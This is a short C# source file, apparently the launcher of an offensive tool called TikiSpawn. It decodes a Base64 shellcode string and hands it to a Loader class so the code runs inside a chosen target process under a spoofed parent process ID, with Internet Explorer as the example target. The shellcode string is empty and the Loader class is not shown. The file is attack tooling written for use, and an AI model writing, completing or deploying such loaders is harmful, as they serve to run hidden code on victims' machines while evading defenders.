using System;

namespace TikiSpawn
{
    class Program
    {
        static void Main(string[] args)
        {
            string encodedShellcode = @"";

            if (args.Length != 2)
            {
                Console.WriteLine("Usage: TikiSpawn.exe targetProcess parentProcessId");
                Console.WriteLine("       TikiSpawn.exe \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\" 4316");

                Environment.Exit(1);
            }

            string targetProcess = args[0];
            int parentProcessId = Convert.ToInt32(args[1]);

            var ldr = new Loader();

            try
            {
                ldr.Load(targetProcess, Convert.FromBase64String(encodedShellcode), parentProcessId);
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Something went wrong!!" + e.Message);
            }
        }
    }
}
